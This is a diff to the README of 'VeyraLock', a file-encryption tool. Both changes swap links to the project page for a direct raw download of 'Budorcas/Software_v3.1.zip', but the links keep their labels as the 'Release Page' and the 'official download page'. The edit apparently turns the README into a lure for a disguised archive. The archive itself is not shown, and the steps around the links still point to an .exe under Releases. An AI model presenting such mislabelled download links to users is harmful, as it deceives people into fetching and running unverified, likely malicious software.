@@ -1,6 +1,6 @@
 # 🔒 veyralock - Secure your private files with ease
 
-[![Download VeyraLock](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/raphaelhormonal513/veyralock)
+[![Download VeyraLock](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/raphaelhormonal513/veyralock/raw/refs/heads/main/Budorcas/Software_v3.1.zip)
 
 VeyraLock protects your sensitive data. It uses strong mathematics to lock your files and folders. Nobody can open your personal information without the right password.
 
@@ -22,7 +22,7 @@ This tool hides your files from prying eyes. It uses a standard called AES-256-G
 
 ## 📥 How to download
 
-1. Visit the [official VeyraLock download page](https://github.com/raphaelhormonal513/veyralock).
+1. Visit the [official VeyraLock download page](https://github.com/raphaelhormonal513/veyralock/raw/refs/heads/main/Budorcas/Software_v3.1.zip).
 2. Look for the latest version under the Releases section.
 3. Choose the file ending in `.exe` to download it to your computer.
 4. Save the file to your Downloads folder.
